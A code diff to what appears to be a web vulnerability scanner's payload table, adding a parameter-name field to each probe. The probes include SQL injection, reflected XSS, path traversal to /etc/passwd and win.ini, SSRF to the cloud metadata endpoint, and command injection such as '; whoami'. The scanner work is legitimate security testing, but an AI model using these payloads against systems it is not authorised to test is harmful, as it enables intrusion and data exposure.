@@ -6,6 +6,7 @@ from typing import Dict, List
 class PayloadTemplate:
     name: str
     method: str
+    param_name: str
     payload: str
     notes: str
 
@@ -15,12 +16,14 @@ VULN_PAYLOADS: Dict[str, List[PayloadTemplate]] = {
         PayloadTemplate(
             name="boolean-auth-bypass",
             method="GET",
+            param_name="q",
             payload="' OR '1'='1' --",
             notes="Classic boolean-based SQL injection probe.",
         ),
         PayloadTemplate(
             name="union-probe",
             method="GET",
+            param_name="q",
             payload="' UNION SELECT NULL,NULL,NULL --",
             notes="Tests for column-count mismatch and reflected data.",
         ),
@@ -29,12 +32,14 @@ VULN_PAYLOADS: Dict[str, List[PayloadTemplate]] = {
         PayloadTemplate(
             name="script-reflection",
             method="GET",
+            param_name="q",
             payload="<script>confirm(document.domain)</script>",
             notes="Minimal reflected XSS probe.",
         ),
         PayloadTemplate(
             name="img-onerror",
             method="GET",
+            param_name="q",
             payload="<img src=x onerror=confirm(1)>",
             notes="Fallback payload for HTML contexts that strip script tags.",
         ),
@@ -43,12 +48,14 @@ VULN_PAYLOADS: Dict[str, List[PayloadTemplate]] = {
         PayloadTemplate(
             name="unix-passwd",
             method="GET",
+            param_name="file",
             payload="../../../../etc/passwd",
             notes="Reads a well-known file if traversal is possible.",
         ),
         PayloadTemplate(
             name="windows-winini",
             method="GET",
+            param_name="file",
             payload="..\\..\\..\\..\\Windows\\win.ini",
             notes="Windows traversal probe.",
         ),
@@ -57,12 +64,14 @@ VULN_PAYLOADS: Dict[str, List[PayloadTemplate]] = {
         PayloadTemplate(
             name="loopback",
             method="GET",
+            param_name="url",
             payload="http://127.0.0.1:80",
             notes="Checks whether the server can be induced to fetch loopback resources.",
         ),
         PayloadTemplate(
             name="metadata",
             method="GET",
+            param_name="url",
             payload="http://169.254.169.254/latest/meta-data/",
             notes="Cloud metadata service probe.",
         ),
@@ -71,12 +80,14 @@ VULN_PAYLOADS: Dict[str, List[PayloadTemplate]] = {
         PayloadTemplate(
             name="command-echo",
             method="POST",
+            param_name="cmd",
             payload="; echo CODE_SENTINEL_RCE_TEST",
             notes="Low-risk command execution probe that echoes a marker.",
         ),
         PayloadTemplate(
             name="whoami",
             method="POST",
+            param_name="cmd",
             payload="; whoami",
             notes="Confirms command execution with a harmless identity readout.",
         ),
